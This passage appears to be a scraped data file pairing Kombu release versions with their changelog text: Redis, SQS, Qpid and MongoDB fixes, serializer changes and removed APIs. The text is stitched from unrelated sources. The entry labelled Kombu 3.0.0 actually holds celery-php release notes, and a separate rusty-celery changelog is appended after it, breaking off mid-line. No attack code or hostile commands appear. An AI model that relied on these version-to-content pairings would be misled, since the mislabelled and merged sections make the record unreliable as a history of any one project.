message.\n\n        See :attr:`kombu.Queue.max_priority`.\n\n- RabbitMQ: ``Message.ack`` now supports the ``multiple`` argument.\n\n    If multiple is set to True, then all messages received before\n    the message being acked will also be acknowledged.\n\n- ``amqps://`` can now be specified to require SSL (Issue 610).\n\n- ``Consumer.cancel_by_queue`` is now constant time.\n\n- ``Connection.ensure*`` now raises :exc:`kombu.exceptions.OperationalError`.\n\n    Things that can be retried are now reraised as\n    :exc:`kombu.exceptions.OperationalError`.\n\n- Redis: Fixed SSL support.\n\n    Contributed by **Robert Kolba**.\n\n- New ``Queue.consumer_arguments`` can be used for the ability to\n  set consumer priority via ``x-priority``.\n\n  See https://www.rabbitmq.com/consumer-priority.html\n\n  Example:\n\n  .. code-block:: python\n\n        Queue(\n            'qname',\n            exchange=Exchange('exchange'),\n            routing_key='qname',\n            consumer_arguments={'x-priority': 3},\n        )\n\n- Queue/Exchange: ``no_declare`` option added (also enabled for\n  internal amq. exchanges) (Issue 565).\n\n- JSON serializer now calls ``obj.__json__`` for unsupported types.\n\n    This means you can now define a ``__json__`` method for custom\n    types that can be reduced down to a built-in json type.\n\n    Example:\n\n    .. code-block:: python\n\n        class Person:\n            first_name = None\n            last_name = None\n            address = None\n\n            def __json__(self):\n                return {\n                    'first_name': self.first_name,\n                    'last_name': self.last_name,\n                    'address': self.address,\n                }\n\n- JSON serializer now handles datetimes, Django promise, UUID and Decimal.\n\n- Beanstalk: Priority 0 is now lowest, 9 is highest.\n  (**backward incompatible**)\n\n    This to match how priorities in AMQP works.\n\n    Fix contributed by **Alex Koshelev**.\n\n- Redis: now supports SSL using the ``ssl`` argument to\n  :class:`~kombu.Connection`.\n\n- Redis: Fanout exchanges are no longer visible between vhosts,\n  and fanout messages can be filtered by patterns.\n  (**backward incompatible**)\n\n    It was possible to enable this mode previously using the\n    ``fanout_prefix``, and ``fanout_patterns``\n    transport options, but now these are enabled by default.\n\n    If you want to mix and match producers/consumers running different\n    versions you need to configure your kombu 3.x clients to also enable\n    these options:\n\n    .. code-block:: pycon\n\n        >>> Connection(transport_options={\n            'fanout_prefix': True,\n            'fanout_patterns': True,\n        })\n\n- Pidbox: Mailbox new arguments: TTL and expiry.\n\n    Mailbox now supports new arguments for controlling\n    message TTLs and queue expiry, both for the mailbox\n    queue and for reply queues.\n\n    - ``queue_expires`` (float/int seconds).\n    - ``queue_ttl`` (float/int seconds).\n    - ``reply_queue_expires`` (float/int seconds).\n    - ``reply_queue_ttl`` (float/int seconds).\n\n    All take seconds in int/float.\n\n    Contributed by **Alan Justino**.\n\n- Exchange.delivery_mode now defaults to :const:`None`, and the default\n  is instead set by ``Producer.publish``.\n\n- :class:`~kombu.Consumer` now supports a new ``prefetch_count`` argument,\n  which if provided will force the consumer to set an initial prefetch count\n  just before starting.\n\n- Virtual transports now stores ``priority`` as a property, not in\n  ``delivery_info``, to be compatible with AMQP.\n\n- ``reply_to`` argument to ``Producer.publish`` can now be\n  :class:`~kombu.Queue` instance.\n\n- Connection: There's now a new method\n  ``Connection.supports_exchange_type(type)`` that can be used to check if the\n  current transport supports a specific exchange type.\n\n- SQS: Consumers can now read json messages not sent by Kombu.\n\n    Contributed by **Juan Carlos Ferrer**.\n\n- SQS: Will now log the access key used when authentication fails.\n\n    Contributed by **Hank John**.\n\n- Added new :class:`kombu.mixins.ConsumerProducerMixin` for consumers that\n  will also publish messages on a separate connection.\n\n- Messages: Now have a more descriptive ``repr``.\n\n    Contributed by **Joshua Harlow**.\n\n- Async: HTTP client based on curl.\n\n- Async: Now uses `poll` instead of `select` where available.\n\n- MongoDB: Now supports priorities\n\n    Contributed by **Alex Koshelev**.\n\n- Virtual transports now supports multiple queue bindings.\n\n    Contributed by **Federico Ficarelli**.\n\n- Virtual transports now supports the anon exchange.\n\n    If when publishing a message, the exchange argument is set to '' (empty\n    string), the routing_key will be regarded as the destination queue.\n\n    This will bypass the routing table compeltely, and just deliver the\n    message to the queue name specified in the routing key.\n\n- Zookeeper: Transport now uses the built-in suport in kazoo to handle\n  failover when using a list of server names.\n\n    Contributed by **Joshua Harlow**.\n\n- ConsumerMixin.run now passes keyword arguments to .consume.\n\nDeprecations and removals\n-------------------------\n\n- The deprecated method ``Consumer.add_queue_from_dict`` has been removed.\n\n    Use instead:\n\n    .. code-block:: python\n\n        consumer.add_queue(Queue.from_dict(queue_name, **options))\n\n- The deprecated function ``kombu.serialization.encode`` has been removed.\n\n    Use :func:`kombu.serialization.dumps` instead.\n\n- The deprecated function ``kombu.serialization.decode`` has been removed.\n\n    Use :func:`kombu.serialization.loads` instead.\n\n- Removed module ``kombu.syn``\n\n    ``detect_environment`` has been moved to kombu.utils.compat\n\n.. _version-3.0.37:\n\n", "3.0.37": "======\n:release-date: 2016-10-06 05:00 P.M PDT\n:release-by: Ask Solem\n\n- Connection: Return value of ``.info()`` was no longer JSON serializable,\n  leading to \"itertools.cycle object not JSON serializable\"\n  errors (Issue 635).\n\n.. _version-3.0.36:\n\n", "3.0.36": "======\n:release-date: 2016-09-30 03:06 P.M PDT\n:release-by: Ask Solem\n\n- Connection: Fixed bug when cloning connection with alternate urls.\n\n    Fix contributed by Emmanuel Cazenave.\n\n- Redis: Fixed problem with unix socket connections.\n\n    https://github.com/celery/celery/issues/2903\n\n    Fix contributed by Raphael Michel.\n\n- Redis: Fixed compatibility with older redis-py versions (Issue 576).\n\n- Broadcast now retains queue name when being copied/pickled (Issue 578).\n\n.. _version-3.0.35:\n\n", "3.0.35": "======\n:release-date: 2016-03-22 11:22 P.M PST\n:release-by: Ask Solem\n\n- msgpack: msgpack support now requires msgpack-python > 0.4.7.\n\n- Redis: TimeoutError was no longer handled as a recoverable error.\n\n- Redis: Adds the ability to set more Redis connection options\n  using ``Connection(transport_options={...})``.\n\n    - ``socket_connect_timeout``\n    - ``socket_keepalive`` (requires :mod:`redis-py` > 2.10)\n    - ``socket_keepalive_options`` (requires :mod:`redis-py` > 2.10)\n\n- msgpack: Fixes support for binary/unicode data\n\n.. _version-3.0.34:\n\n", "3.0.34": "======\n:release-date: 2016-03-03 05:30 P.M PST\n:release-by: Ask Solem\n\n- Qpid: Adds async error handling.\n\n    Contributed by Brian Bouterse.\n\n- Qpid: Delivery tag is now a UUID4 (Issue 563).\n\n    Fix contributed by Brian Bouterse.\n\n- Redis: Connection.as_uri() returned malformed URLs when the\n  ``redis+socket`` scheme was ised (Issue celery/celery2995).\n\n- msgpack: Use binary encoding instead of utf-8 (Issue 570).\n\n.. _version-3.0.33:\n\n", "3.0.33": "======\n:release-date: 2016-01-08 06:36 P.M PST\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.9.\n\n- Redis: Fixed problem with auxilliary connections causing the main\n  consumer connection to be closed (Issue 550).\n\n- Qpid: No longer uses threads to operate, to ensure compatibility with\n  all environments (Issue 531).\n\n.. _version-3.0.32:\n\n", "3.0.32": "======\n:release-date: 2015-12-16 02:29 P.M PST\n:release-by: Ask Solem\n\n- Redis: Fixed bug introduced in 3.0.31 where the redis transport always\n  connects to localhost, regardless of host setting.\n\n.. _version-3.0.31:\n\n", "3.0.31": "======\n:release-date: 2015-12-16 12:00 P.M PST\n:release-by: Ask Solem\n\n- Redis: Fixed bug introduced in 3.0.30 where socket was prematurely\n  disconnected.\n\n- Hub: Removed debug logging message: \"Deregistered fd...\" (Issue 549).\n\n.. _version-3.0.30:\n\n", "3.0.30": "======\n:release-date: 2015-12-07 12:28 A.M PST\n:release-by: Ask Solem\n\n- Fixes compatiblity with uuid in Python 2.7.11 and 3.5.1.\n\n    Fix contributed by Kai Groner.\n\n- Redis transport: Attempt at fixing problem with hanging consumer\n  after disconnected from server.\n\n- Event loop:\n    Attempt at fixing issue with 100% CPU when using the Redis transport,\n\n- Database transport: Fixed oracle compatiblity.\n\n    An \"ORA-00907: missing right parenthesis\" error could manifest when using\n    an Oracle database with the database transport.\n\n    Fix contributed by Deepak N.\n\n- Documentation fixes\n\n    Contributed by Tommaso Barbugli.\n\n.. _version-3.0.29:\n\n", "3.0.29": "======\n:release-date: 2015-10-26 11:10 A.M PDT\n:release-by: Ask Solem\n\n- Fixed serialization issue for ``bindings.as_dict()`` (Issue 453).\n\n    Fix contributed by Sergey Tikhonov.\n\n- Json serializer wrongly treated bytes as ``ascii``, not ``utf-8``\n  (Issue 532).\n\n- MongoDB: Now supports pymongo 3.x.\n\n    Contributed by Len Buckens.\n\n- SQS: Tests passing on Python 3.\n\n    Fix contributed by Felix Yan\n\n.. _version-3.0.28:\n\n", "3.0.28": "======\n:release-date: 2015-10-12 12:00 PM PDT\n:release-by: Ask Solem\n\n.. admonition:: Django transport migrations.\n\n    If you're using Django 1.8 and have already created the\n    kombu_transport_django tables, you have to run a fake initial migration:\n\n    .. code-block:: console\n\n        $ python manage.py migrate kombu_transport_django --fake-initial\n\n- No longer compatible with South by default.\n\n    To keep using kombu.transport.django with South migrations\n    you now need to configure a new location for the kombu migrations:\n\n    .. code-block:: python\n\n        SOUTH_MIGRATION_MODULES = {\n            'kombu_transport_django':\n                'kombu.transport.django.south_migrations',\n        }\n\n- Keep old South migrations in ``kombu.transport.django.south_migrations``.\n\n- Now works with Redis < 2.10 again.\n\n.. _version-3.0.27:\n\n", "3.0.27": "======\n:release-date: 2015-10-09 3:10 PM PDT\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.7.\n\n- Fixed libSystem import error on some macOS 10.11 (El Capitan) installations.\n\n    Fix contributed by Eric Wang.\n\n- Now compatible with Django 1.9.\n\n- Django: Adds migrations for the database transport.\n\n- Redis: Now depends on py-redis 2.10.0 or later (Issue 468).\n\n- QPid: Can now connect as localhost (Issue 519).\n\n    Fix contributed by Brian Bouterse.\n\n- QPid: Adds support for ``login_method`` (Issue 502, Issue 499).\n\n    Contributed by Brian Bouterse.\n\n- QPid: Now reads SASL mechanism from broker string (Issue 498).\n\n    Fix contributed by Brian Bouterse.\n\n- QPid: Monitor thread now properly terminated on session close (Issue 485).\n\n    Fix contributed by Brian Bouterse.\n\n- QPid: Fixed file descriptor leak (Issue 476).\n\n    Fix contributed by Jeff Ortel\n\n- Docs: Fixed wrong order for entrypoint arguments (Issue 473).\n\n- ConsumerMixin: Connection error logs now include traceback (Issue 480).\n\n- BaseTransport now raises RecoverableConnectionError when disconnected\n  (Issue 507).\n\n- Consumer: Adds ``tag_prefix`` option to modify how consumer tags are\n  generated (Issue 509).\n\n.. _version-3.0.26:\n\n", "3.0.26": "======\n:release-date: 2015-04-22 06:00 P.M UTC\n:release-by: Ask Solem\n\n- Fixed compatibility with py-redis versions before 2.10.3 (Issue 470).\n\n.. _version-3.0.25:\n\n", "3.0.25": "======\n:release-date: 2015-04-21 02:00 P.M UTC\n:release-by: Ask Solem\n\n- pyamqp/librabbitmq now uses 5671 as default port when SSL is enabled\n  (Issue 459).\n\n- Redis: Now supports passwords in ``redis+socket://:passhost:port`` URLs\n  (Issue 460).\n\n- ``Producer.publish`` now defines the ``expiration`` property in support\n  of the `RabbitMQ per-message TTL extension`_.\n\n    Contributed by Anastasis Andronidis.\n\n- Connection transport attribute now set correctly for all transports.\n\n    Contributed by Alex Koshelev.\n\n- qpid: Fixed bug where the connectionw as not being closed properly.\n\n    Contributed by Brian Bouterse.\n\n- :class:`~kombu.entity.bindings` is now JSON serializable (Issue 453).\n\n    Contributed by Sergey Tikhonov.\n\n- Fixed typo in error when yaml is not installed (said ``msgpack``).\n\n    Contributed by Joshua Harlow.\n\n- Redis: Now properly handles :exc:`redis.exceptions.TimeoutError`\n  raised by :mod:`redis`.\n\n    Contributed by markow.\n\n- qpid: Adds additional string to check for when connecting to qpid.\n\n    When we connect to qpid, we need to ensure that we skip to the next SASL\n    mechanism if the current mechanism fails. Otherwise, we will keep retrying the\n    connection with a non-working mech.\n\n    Contributed by Chris Duryee.\n\n- qpid: Handle ``NotFound`` exceptions.\n\n    Contributed by Brian Bouterse.\n\n- :class:`Queue.__repr__` now makes sure return value is not unicode\n  (Issue 440).\n\n- qpid: ``Queue.purge`` incorrectly raised :exc:`AttributeErrror` if the\n  does not exist (Issue 439).\n\n    Contributed by Brian Bouterse.\n\n- Linux: Now ignores permission errors on epoll unregister.\n\n.. _`RabbitMQ per-message TTL extension`: https://www.rabbitmq.com/ttl.html\n\n.. _version-3.0.24:\n\n", "3.0.24": "======\n:release-date: 2014-11-17 11:00 P.M UTC\n:release-by: Ask Solem\n\n- The `Qpid <http://qpid.apache.org/>`_ broker is supported for Python 2.x\n  environments. The Qpid transport includes full SSL support within Kombu. See\n  the :mod:`kombu.transport.qpid` docs for more info.\n\n    Contributed by Brian Bouterse and Chris Duryee through support from Red Hat.\n\n- Dependencies: extra[librabbitmq] now requires librabbitmq 1.6.0\n\n- Docstrings for :class:`~kombu.utils.limit.TokenBucket` did not match\n  implementation.\n\n    Fix contributed by Jesse Dhillon.\n\n- :func:`~kombu.common.oid_from` accidentally called ``uuid.getnode()`` but\n  did not use the return value.\n\n    Fix contributed by Alexander Todorov.\n\n- Redis: Now ignores errors when cosing the underlying connection.\n\n- Redis: Restoring messages will now use a single connection.\n\n- ``kombu.five.monotonic``: Can now be imported even if ctypes is not\n  available for some reason (e.g. App Engine)\n\n- Documentation: Improved example to use the ``declare`` argument to\n  ``Producer`` (Issue 423).\n\n- Django: Fixed ``app_label`` for older Django versions (``< 1.7``).\n  (Issue 414).\n\n.. _version-3.0.23:\n\n", "3.0.23": "======\n:release-date: 2014-09-14 10:45 P.M UTC\n:release-by: Ask Solem\n\n- Django: Fixed bug in the Django 1.7 compatibility improvements related\n  to autocommit handling.\n\n    Contributed by Radek Czajka.\n\n- Django: The Django transport models would not be created on syncdb\n  after app label rename (Issue 406).\n\n.. _version-3.0.22:\n\n", "3.0.22": "======\n:release-date: 2014-09-04 03:00 P.M UTC\n:release-by: Ask Solem\n\n- kombu.async: Min. delay between waiting for timer was always increased to\n  one second.\n\n- Fixed bug in itermessages where message is received after the with\n  statement exits the block.\n\n    Fixed by Rumyana Neykova\n\n- Connection.autoretry: Now works with functions missing wrapped attributes\n    (``__module__``, ``__name__``, ``__doc__``).  Fixes 392.\n\n    Contributed by johtso.\n\n- Django: Now sets custom app label for ``kombu.transport.django`` to work\n  with recent changes in Django 1.7.\n\n- SimpleQueue removed messages from the wrong end of buffer (Issue 380).\n\n- Tests: Now using ``unittest.mock`` if available (Issue 381).\n\n.. _version-3.0.21:\n\n", "3.0.21": "======\n:release-date: 2014-07-07 02:00 P.M UTC\n:release-by: Ask Solem\n\n- Fixed remaining bug in ``maybe_declare`` for ``auto_delete`` exchanges.\n\n    Fix contributed by Roger Hu.\n\n- MongoDB: Creating a channel now properly evaluates a connection (Issue 363).\n\n    Fix contributed by Len Buckens.\n\n.. _version-3.0.20:\n\n", "3.0.20": "======\n:release-date: 2014-06-24 02:30 P.M UTC\n:release-by: Ask Solem\n\n- Reverts change in 3.0.17 where ``maybe_declare`` caches the declaration\n  of auto_delete queues and exchanges.\n\n    Fix contributed by Roger Hu.\n\n- Redis: Fixed race condition when using gevent and the channel is closed.\n\n    Fix contributed by Andrew Rodionoff.\n\n.. _version-3.0.19:\n\n", "3.0.19": "======\n:release-date: 2014-06-09 03:10 P.M UTC\n:release-by: Ask Solem\n\n- The wheel distribution did not support Python 2.6 by failing to list\n  the extra dependencies required.\n\n- Durable and auto_delete queues/exchanges can be be cached using\n  ``maybe_declare``.\n\n.. _version-3.0.18:\n\n", "3.0.18": "======\n:release-date: 2014-06-02 06:00 P.M UTC\n:release-by: Ask Solem\n\n- A typo introduced in 3.0.17 caused kombu.async.hub to crash (Issue 360).\n\n.. _version-3.0.17:\n\n", "3.0.17": "======\n:release-date: 2014-06-02 05:00 P.M UTC\n:release-by: Ask Solem\n\n- ``kombu[librabbitmq]`` now depends on librabbitmq 1.5.2.\n\n- Async: Event loop now selectively removes file descriptors for the mode\n  it failed in, and keeps others (e.g read vs write).\n\n    Fix contributed by Roger Hu.\n\n- CouchDB: Now works without userid set.\n\n    Fix contributed by Latitia M. Haskins.\n\n- SQLAlchemy: Now supports recovery from connection errors.\n\n    Contributed by Felix Schwarz.\n\n- Redis: Restore at shutdown now works when ack emulation is disabled.\n\n- :func:`kombu.common.eventloop` accidentally swallowed socket errors.\n\n- Adds :func:`kombu.utils.url.sanitize_url`\n\n.. _version-3.0.16:\n\n", "3.0.16": "======\n:release-date: 2014-05-06 01:00 P.M UTC\n:release-by: Ask Solem\n\n- ``kombu[librabbitmq]`` now depends on librabbitmq 1.5.1.\n\n- Redis: Fixes ``TypeError`` problem in ``unregister`` (Issue 342).\n\n    Fix contributed by Tobias Schottdorf.\n\n- Tests: Some unit tests accidentally required the `redis-py` library.\n\n    Fix contributed by Randy Barlow.\n\n- librabbitmq: Would crash when using an older version of :mod:`librabbitmq`,\n  now emits warning instead.\n\n.. _version-3.0.15:\n\n", "3.0.15": "======\n:release-date: 2014-04-15 09:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.5.\n\n- RabbitMQ 3.3 changes QoS semantics (Issue 339).\n\n    See the RabbitMQ release notes here:\n    http://www.rabbitmq.com/blog/2014/04/02/breaking-things-with-rabbitmq-3-3/\n\n    A new connection property has been added that can be used to detect\n    whether the remote server is using this new QoS behavior:\n\n    .. code-block:: pycon\n\n        >>> Connection('amqp://').qos_behavior_matches_spec\n        False\n\n    so if your application depends on the old semantics you can\n    use this to set the ``apply_global`` flag appropriately:\n\n    .. code-block:: python\n\n        def update_prefetch_count(channel, new_value):\n            channel.basic_qos(\n                0, new_value,\n                not channel.connection.client.qos_behavior_matches_spec,\n            )\n\n- Users of :mod:`librabbitmq` is encouraged to upgrade to librabbitmq 1.5.0.\n\n    The ``kombu[librabbitmq]`` extra has been updated to depend on this\n    version.\n\n- Pools: Now takes transport options into account when comparing connections\n  (Issue 333).\n\n- MongoDB: Fixes Python 3 compatibility.\n\n- Async: select: Ignore socket errors when attempting to unregister handles\n  from the loop.\n\n- Pidbox: Can now be configured to use a serializer other than json,\n  but specifying a serializer argument to :class:`~kombu.pidbox.Mailbox`.\n\n    Contributed by Dmitry Malinovsky.\n\n- Message decompression now works with Python 3.\n\n    Fix contributed by Adam Gaca.\n\n.. _version-3.0.14:\n\n", "3.0.14": "======\n:release-date: 2014-03-19 07:00 P.M UTC\n:release-by: Ask Solem\n\n- **MongoDB**: Now endures a connection failover (Issue 123).\n\n    Fix contributed by Alex Koshelev.\n\n- **MongoDB**: Fixed ``KeyError`` when a replica set member is removed.\n\n    Also fixes celery971 and celery/898.\n\n    Fix contributed by Alex Koshelev.\n\n- **MongoDB**: Fixed MongoDB broadcast cursor re-initialization bug.\n\n    Fix contributed by Alex Koshelev.\n\n- **Async**: Fixed bug in lax semaphore implementation where in\n  some usage patterns the limit was not honored correctly.\n\n    Fix contributed by Ionel Cristian M\u0103rie\u0219.\n\n- **Redis**: Fixed problem with fanout when using Python 3 (Issue 324).\n\n- **Redis**: Fixed ``AttributeError`` from attempting to close a non-existing\n  connection (Issue 320).\n\n.. _version-3.0.13:\n\n", "3.0.13": "======\n:release-date: 2014-03-03 04:00 P.M UTC\n:release-by: Ask Solem\n\n- Redis: Fixed serious race condition that could lead to data loss.\n\n    The delivery tags were accidentally set to be an incremental number\n    local to the channel, but the delivery tags need to be globally\n    unique so that a message can not overwrite an older message\n    in the backup store.\n\n    This change is not backwards incompatible and you are encouraged\n    to update all your system using a previous version as soon as possible.\n\n- Now depends on :mod:`amqp` 1.4.4.\n\n- Pidbox: Now makes sure message encoding errors are handled by default,\n  so that a custom error handler does not need to be specified.\n\n- Redis: The fanout exchange can now use AMQP patterns to route and filter\n  messages.\n\n    This change is backwards incompatible and must be enabled with\n    the ``fanout_patterns`` transport option:\n\n    .. code-block:: pycon\n\n        >>> conn = kombu.Connection('redis://', transport_options={\n        ...     'fanout_patterns': True,\n        ... })\n\n    When enabled the exchange will work like an amqp topic exchange\n    if the binding key is a pattern.\n\n    This is planned to be default behavior in the future.\n\n- Redis: Fixed ``cycle`` no such attribute error.\n\n.. _version-3.0.12:\n\n", "3.0.12": "======\n:release-date: 2014-02-09 03:50 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.3.\n\n- Fixes Python 3.4 logging incompatibility (Issue 311).\n\n- Redis: Now properly handles unknown pub/sub messages.\n\n    Fix contributed by Sam Stavinoha.\n\n- amqplib: Fixed bug where more bytes were requested from the socket\n  than necessary.\n\n    Fix contributed by Ionel Cristian M\u0103rie\u0219.\n\n.. _version-3.0.11:\n\n", "3.0.11": "======\n:release-date: 2014-02-03 05:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.2.\n\n- Now always trusts messages of type `application/data` and `application/text`\n  or which have an unspecified content type (Issue 306).\n\n- Compression errors are now handled as decode errors and will trigger\n  the ``Consumer.on_decode_error`` callback if specified.\n\n- New ``kombu.Connection.get_heartbeat_interval()`` method that can be\n  used to access the negotiated heartbeat value.\n\n- `kombu.common.oid_for` no longer uses the MAC address of the host, but\n   instead uses a process-wide UUID4 as a node id.\n\n    This avoids a call to `uuid.getnode()` at module scope.\n\n- Hub.add: Now normalizes registered fileno.\n\n    Contributed by Ionel Cristian M\u0103rie\u0219.\n\n- SQS: Fixed bug where the prefetch count limit was not respected.\n\n.. _version-3.0.10:\n\n", "3.0.10": "======\n:release-date: 2014-01-17 05:40 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.1.\n\n- ``maybe_declare`` now raises a \"recoverable connection error\" if\n  the channel is disconnected instead of a :exc:`ChannelError` so that\n  the operation can be retried.\n\n- Redis: ``Consumer.cancel()`` is now thread safe.\n\n    This fixes an issue when using gevent/eventlet and a\n    message is handled after the consumer is canceled resulting\n    in a \"message for queue without consumers\" error.\n\n- Retry operations would not always respect the interval_start\n  value when calculating the time to sleep for (Issue 303).\n\n    Fix contributed by Antoine Legrand.\n\n- Timer: Fixed \"unhashable type\" error on Python 3.\n\n- Hub: Do not attempt to unregister operations on an already closed\n  poller instance.\n\n.. _version-3.0.9:\n\n", "3.0.9": "=====\n:release-date: 2014-01-13 05:30 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.0.\n\n- Redis: Basic cancel for fanout based queues now sends a corresponding\n  ``UNSUBSCRIBE`` command to the server.\n\n    This fixes an issue with pidbox where reply messages could be received\n    after the consumer was canceled, giving the ``\"message to queue without\n    consumers\"`` error.\n\n- MongoDB: Improved connection string and options handling\n  (Issue 266 + Issue 120).\n\n    Contributed by Alex Koshelev.\n\n- SQS: Limit the number of messages when receiving in batch to 10.\n\n    This is a hard limit enforced by Amazon so the sqs transport\n    must not exceeed this value.\n\n    Fix contributed by Eric Reynolds.\n\n- ConsumerMixin: ``consume`` now checks heartbeat every time the\n  socket times out.\n\n    Contributed by Dustin J. Mitchell.\n\n- Retry Policy: A max retries of 0 did not retry forever.\n\n    Fix contributed by Antoine Legrand.\n\n- Simple: If passing a Queue object the simple utils will now take\n  default routing key from that queue.\n\n    Contributed by Fernando Jorge Mota.\n\n- ``repr(producer)`` no longer evaluates the underlying channnel.\n\n- Redis: The map of Redis error classes are now exposed at the module level\n  using the :func:`kombu.transport.redis.get_redis_error_classes` function.\n\n- Async: ``Hub.close`` now sets ``.poller`` to None.\n\n.. _version-3.0.8:\n\n", "3.0.8": "=====\n:release-date: 2013-12-16 05:00 P.M UTC\n:release-by: Ask Solem\n\n- Serializer: loads and dumps now wraps exceptions raised into\n  :exc:`~kombu.exceptions.DecodeError` and\n  :exc:`kombu.exceptions.EncodeError` respectively.\n\n    Contributed by Ionel Cristian Maries\n\n- Redis: Would attempt to read from the wrong connection if a select/epoll/kqueue\n  exception event happened.\n\n    Fix contributed by Michael Nelson.\n\n- Redis: Disabling ack emulation now works properly.\n\n    Fix contributed by Michael Nelson.\n\n- Redis: :exc:`IOError` and :exc:`OSError` are now treated as recoverable\n  connection errors.\n\n- SQS: Improved performance by reading messages in bulk.\n\n    Contributed by Matt Wise.\n\n- Connection Pool: Attempting to acquire from a closed pool will now\n  raise :class:`RuntimeError`.\n\n.. _version-3.0.7:\n\n", "3.0.7": "=====\n:release-date: 2013-12-02 04:00 P.M UTC\n:release-by: Ask Solem\n\n- Fixes Python 2.6 compatibility.\n\n- Redis: Fixes 'bad file descriptor' issue.\n\n.. _version-3.0.6:\n\n", "3.0.6": "=====\n:release-date: 2013-11-21 04:50 P.M UTC\n:release-by: Ask Solem\n\n- Timer: No longer attempts to hash keyword arguments (Issue 275).\n\n- Async: Did not account for the long type for file descriptors.\n\n    Fix contributed by Fabrice Rabaute.\n\n- PyPy: kqueue support was broken.\n\n- Redis: Bad pub/sub payloads no longer crashes the consumer.\n\n- Redis: Unix socket URLs can now specify a virtual host by including\n  it as a query parameter.\n\n    Example URL specifying a virtual host using database number 3:\n\n    .. code-block:: text\n\n        redis+socket:///tmp/redis.sock?virtual_host=3\n\n- ``kombu.VERSION`` is now a named tuple.\n\n.. _version-3.0.5:\n\n", "3.0.5": "=====\n:release-date: 2013-11-15 11:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.3.3.\n\n- Redis: Fixed Python 3 compatibility problem (Issue 270).\n\n- MongoDB: Fixed problem with URL parsing when authentication used.\n\n    Fix contributed by dongweiming.\n\n- pyamqp: Fixed small issue when publishing the message and\n  the property dictionary was set to None.\n\n    Fix contributed by Victor Garcia.\n\n- Fixed problem in ``repr(LaxBoundedSemaphore)``.\n\n    Fix contributed by Antoine Legrand.\n\n- Tests now passing on Python 3.3.\n\n.. _version-3.0.4:\n\n", "3.0.4": "=====\n:release-date: 2013-11-08 01:00 P.M UTC\n:release-by: Ask Solem\n\n- common.QoS: ``decrement_eventually`` now makes sure the value\n  does not go below 1 if a prefetch count is enabled.\n\n.. _version-3.0.3:\n\n", "3.0.3": "=====\n:release-date: 2013-11-04 03:00 P.M UTC\n:release-by: Ask Solem\n\n- SQS: Properly reverted patch that caused delays between messages.\n\n    Contributed by James Saryerwinnie\n\n- select: Clear all registerd fds on poller.cloe\n\n- Eventloop: unregister if EBADF raised.\n\n.. _version-3.0.2:\n\n", "3.0.2": "=====\n:release-date: 2013-10-29 02:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` version 1.3.2.\n\n- select: Fixed problem where unregister did not properly remove\n  the fd.\n\n.. _version-3.0.1:\n\n", "3.0.1": "=====\n:release-date: 2013-10-24 04:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` version 1.3.1.\n\n- Redis: New option ``fanout_keyprefix``\n\n    This transport option is recommended for all users as it ensures\n    that broadcast (fanout) messages sent is only seen by the current\n    virtual host:\n\n    .. code-block:: python\n\n        Connection('redis://', transport_options={'fanout_keyprefix': True})\n\n    However, enabling this means that you cannot send or receive messages\n    from older Kombu versions so make sure all of your participants\n    are upgraded and have the transport option enabled.\n\n    This will be the default behavior in Kombu 4.0.\n\n- Distribution: Removed file ``requirements/py25.txt``.\n\n- MongoDB: Now disables ``auto_start_request``.\n\n- MongoDB: Enables ``use_greenlets`` if eventlet/gevent used.\n\n- Pidbox: Fixes problem where expires header was None,\n  which is a value not supported by the amq protocol.\n\n- ConsumerMixin: New ``consumer_context`` method for starting\n  the consumer without draining events.\n\n.. _version-3.0.0:\n\n", "3.0.0": "- **Removed support for PHP 5.3.**\n- celery-php now uses a PSR-4 compliant namespace, `Celery`. To migrate to the\n  new version, change code from `new Celery(\u2026)` to `new \\Celery\\Celery(\u2026)`.\n- Now supports php-amqplib/php-amqplib for the amqplib backend as\n  videlalvaro/php-amqplib is abandoned.\n- Fix crash with the ampqlib backend when Celery has not yet created the\n  results exchange.\n- The `Celery` constructor no longer accepts the argument\n  `persistent_messages`. It was previously unused.\n- celery-php now uses Celery task protocol version 2 and requires Celery 4.0+.\n\n\n Changelog\n\nAll notable changes to this project will be documented in this file.\n\nThe format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),\nand this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).\n\n Unreleased\n\n [v0.5.5](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.5.5) - 2023-09-25\n\n Fixed\n\n- Replaced unnecessary `println!` with `log::info!`.\n\n [v0.5.4](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.5.4) - 2023-09-11\n\n Fixed\n\n- Skip warning about redis heartbeat when not necessary.\n\n [v0.5.3](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.5.3) - 2023-02-28\n\n Fixed\n\n- `BrokerBuilder` is now `Send + Sync`.\n\n [v0.5.2](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.5.2) - 2023-02-20\n\n Changed\n\n- Store a reference to the Celery app in Request.\n\n Fixed\n\n- Fixed compilation issue on Windows.\n\n [v0.5.1](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.5.1) - 2023-02-16\n\n Fixed\n\n- Bumped base64 to it's latest and safest version\n- Bumped tokio to it's latest version\n- Bumped rmp-serde to it's latest version\n- Bumped serde_yaml to it's latest version\n- Bumped uuid to it's latest version\n- Bumped once_cell to it's latest version\n- Bumped redis to it's latest version\n- Bumped env_logger to it's latest version\n- Bumped mypy to it's latest version\n- Bumped black to it's latest version\n- Bumped flake8 to it's latest version\n\n [v0.5.0](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.5.0) - 2023-02-14\n\n Changed\n\n- Changed Celery type to be broker agnostic, allowing broker to be chosen dynamically at runtime.\n\n [v0.4.0](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.4.0) - 2023-02-03\n\n Fixed\n\n- Bumped Lapin to it's latest and safest version\n- Bumped black to it's latest version, 